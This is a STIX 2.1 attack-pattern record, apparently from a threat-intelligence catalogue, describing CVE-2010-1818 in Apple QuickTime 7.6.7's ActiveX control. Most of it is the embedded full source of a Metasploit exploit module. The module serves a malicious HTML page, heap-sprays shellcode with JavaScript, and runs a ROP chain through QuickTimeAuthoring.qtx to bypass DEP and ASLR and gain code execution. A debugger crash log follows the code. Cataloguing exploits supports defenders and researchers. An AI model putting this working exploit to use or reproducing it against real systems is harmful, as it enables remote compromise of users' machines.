{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2d7ed902-8bd9-47f8-83ac-05f326ec89ce",
    "created": "2024-08-14T16:43:01.809501Z",
    "modified": "2024-08-14T16:43:01.809506Z",
    "name": "Apple QuickTime 7.6.7 _Marshaled_pUnk Code Execution",
    "description": " This module exploits a memory trust issue in Apple QuickTime 7.6.7. When processing a specially-crafted HTML page, the QuickTime ActiveX control will treat a supplied parameter as a trusted pointer. It will then use it as a COM-type pUnknown and lead to arbitrary code execution.  This exploit utilizes a combination of heap spraying and the QuickTimeAuthoring.qtx module to bypass DEP and ASLR. This module does not opt-in to ASLR. As such, this module should be reliable on all Windows versions.  NOTE: The addresses may need to be adjusted for older versions of QuickTime. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/apple_quicktime_marshaled_punk.rb",
            "external_id": "apple_quicktime_marshaled_punk.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-1818"
        },
        {
            "source_name": "reference",
            "url": "http://reversemode.com/index.php?option=com_content&task=view&id=69&Itemid=1"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::Seh\n\n  #include Msf::Exploit::Remote::BrowserAutopwn\n  #autopwn_info({\n  #  :os_name => OperatingSystems::Match::WINDOWS,\n  #  :ua_name    => HttpClients::IE,\n  #  :javascript => true,\n  #  :rank       => NormalRanking, # reliable memory corruption\n  #})\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Apple QuickTime 7.6.7 _Marshaled_pUnk Code Execution',\n      'Description'    => %q{\n          This module exploits a memory trust issue in Apple QuickTime\n        7.6.7. When processing a specially-crafted HTML page, the QuickTime ActiveX\n        control will treat a supplied parameter as a trusted pointer. It will\n        then use it as a COM-type pUnknown and lead to arbitrary code execution.\n\n        This exploit utilizes a combination of heap spraying and the\n        QuickTimeAuthoring.qtx module to bypass DEP and ASLR. This module does not\n        opt-in to ASLR. As such, this module should be reliable on all Windows\n        versions.\n\n        NOTE: The addresses may need to be adjusted for older versions of QuickTime.\n      },\n      'Author'         =>\n        [\n          'Ruben Santemarta',  # original discovery\n          'jduck'              # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2010-1818' ],\n          [ 'OSVDB', '67705'],\n          [ 'URL', 'http://reversemode.com/index.php?option=com_content&task=view&id=69&Itemid=1' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 384, # perhaps more?\n          'BadChars' => \"\",  # none...\n          'DisableNops' => true,\n          'PrependEncoder' => Metasm::Shellcode.assemble(Metasm::Ia32.new, \"mov esp,ebp\").encode_string, # fix esp up\n        },\n      'Platform' => 'win',\n      'Targets'  =>\n        [\n          # Tested OK:\n          #\n          # QT 7.6.6 + XP SP3 + IE8\n          # QT 7.6.7 + XP SP3 + IE6\n          #\n\n          # @eromang reports it doesn't work on 7.6.5\n          # - further investigation shows QuickTimeAuthoring.qtx changed / rop gadgets different\n\n          # QuickTimeAuthoring.qtx 7.6.7 is compiled w/DYNAMIC_BASE, so win7 is :(\n\n          [ 'Apple QuickTime Player 7.6.6 and 7.6.7 on Windows XP SP3',\n            {\n              'Ret' => 0x677a0000, # base of QuickTimeAuthoring.qtx\n              #'Ret' => 0x67780000, # base of QuickTimeAuthoring.qtx v7.6.5\n            }\n          ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2010-08-30',\n      'DefaultTarget'  => 0))\n  end\n\n  def on_request_uri(client, request)\n\n    return if ((p = regenerate_payload(client)) == nil)\n\n    print_status(\"Sending exploit HTML...\")\n\n    shellcode = Rex::Text.to_unescape(p.encoded)\n\n    # We will spray to this address, hopefully\n    spray_target = 0x15220c20\n\n    # This is where our happy little dll is loaded\n    # 677a0000 679ce000   QuickTimeAuthoring C:\\Program Files\\QuickTime\\QTSystem\\QuickTimeAuthoring.qtx\n    rop_mod_base = target.ret\n\n    sploit = [\n      spray_target - 8,\n\n      # This first piece of code points the stack pointer to our data!\n      # NOTE: eax, ecx, and esi all point to our spray at this point.\n      rop_mod_base + 0x79c12, # xchg eax,esp / pop edi / pop esi / ret\n\n      # The second one becomes the new program counter after stack flip.\n      rop_mod_base + 0x1e27,       # pop ecx / ret\n        rop_mod_base + 0x170088,  # the IAT addr for HeapCreate (becomes ecx)\n\n      # We get the address of HeapCreate from the IAT here.\n      rop_mod_base + 0x10244, # mov eax,[ecx] / ret\n\n      # Call HeapCreate to create the k-rad segment\n      rop_mod_base + 0x509e, # call eax\n        0x01040110, # flOptions (gets & with 0x40005)\n        0x01010101, # dwInitialSize\n        0x01010101, # dwMaximumSize\n\n      # Don't bother calling HeapAlloc, just add 0x8000 to the Heap Base\n\n      # Set ebx to our adjustment\n      rop_mod_base + 0x307a, # pop ebx / ret\n        0x8000, # becomes ebx\n\n      # Adjust eax\n      rop_mod_base + 0xbfb5b, # add eax,ebx / ret\n\n      # Save our buffer pointer off to this address\n      rop_mod_base + 0x1e27,       # pop ecx / ret\n        rop_mod_base + 0x2062d4,  # something writable\n\n      # Write eax to the address\n      rop_mod_base + 0x8fd6, # mov [ecx], eax / ret\n\n      # Now we must copy our real payload into the buffer\n\n      # First, setup edi\n      rop_mod_base + 0x134fd5, # xchg eax,edi / ret\n\n      # Get ESI from EDI (which is now in EAX)\n      rop_mod_base + 0x103ff8, # push eax / pop esi / pop ebx / ret\n        0x41414141, # scratch (becomes ebx)\n\n      # Set ECX from the stack\n      rop_mod_base + 0x1e27,       # pop ecx / ret\n        0x200 / 4, # dwords to copy :)\n\n      # copy it!\n      rop_mod_base + 0x778d2, # rep movsd / pop edi / pop esi / ret\n        0x41414141, # scratch (becomes edi)\n        0x41414141, # scratch (becomes esi)\n\n      # Re-load the buffer pointer address\n      rop_mod_base + 0x1e27,       # pop ecx / ret\n        rop_mod_base + 0x2062d4,  # something writable\n\n      # And the pointer value itself\n      rop_mod_base + 0x10244, # mov eax,[ecx] / ret\n\n      # Set ebx to our adjustment\n      rop_mod_base + 0x307a, # pop ebx / ret\n        0x42424242, # will be filled after array init\n\n      # Adjust eax\n      rop_mod_base + 0xbfb5b, # add eax,ebx / ret\n\n      # Jump!\n      rop_mod_base + 0x509e,  # call eax\n\n      # eh? Hopefull we didn't reach here.\n      0xdeadbeef\n    ]\n    sploit[27] = 8 + (sploit.length * 4)\n    sploit = sploit.pack('V*')\n    sploit << p.encoded\n    sploit = Rex::Text.to_unescape(sploit)\n\n    custom_js = <<-EOF\nfunction Prepare()\n{\n  var block = unescape(\"#{sploit}\");\n  while(block.length < 0x200)\n    block += unescape(\"%u0000\");\n  heap = new heapLib.ie(0x20000);\n  while(block.length < 0x80000)\n    block += block;\n  finalspray = block.substring(2, 0x80000 - 0x21);\n  for(var i = 0; i < 350; i++)\n  {\n  heap.alloc(finalspray);\n  }\n}\n\nfunction start()\n{\n  var obj = '<' + 'object classid=\"clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B\" width=\"0\" height=\"0\"'+'>'\n    + '</'+ 'object>';\n  document.getElementById('stb').innerHTML = obj;\n  Prepare();\n  var targ = #{spray_target};\n  var obj = '<' + 'object classid=\"clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B\" width=\"0\" height=\"0\"' + '>'\n    + '<' + 'PARAM name=\"_Marshaled_pUnk\" value=\"' + targ + '\"' + '/>'\n    + '</'+ 'object>';\n  document.getElementById('xpl').innerHTML = obj;\n}\nEOF\n\n    hl_js = heaplib(custom_js)\n\n    content = <<-EOF\n<html>\n<head>\n<script language=\"javascript\">\n#{hl_js}\n</script>\n</head>\n<body onload=\"start()\">\n<div id=\"stb\"></div>\n<div id=\"xpl\"></div>\n</body>\n</html>\nEOF\n\n    # ..\n    send_response(client, content, { 'Content-Type' => \"text/html\" })\n\n    # Handle the payload\n    handler(client)\n  end\nend\n\n\n=begin\n(7fc.a4): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=15220c20 ebx=00134ca8 ecx=15220c18 edx=00134b98 esi=15220c20 edi=00134bfc\neip=deadbe01 esp=00134b7c ebp=00134b90 iopl=0         nv up ei pl nz na po nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202\ndeadbe01 ??              ???\n=end\n",
    "x_mitre_disclosure_date": "2010-08-30",
    "x_mitre_platforms": [
        "win'"
    ]
}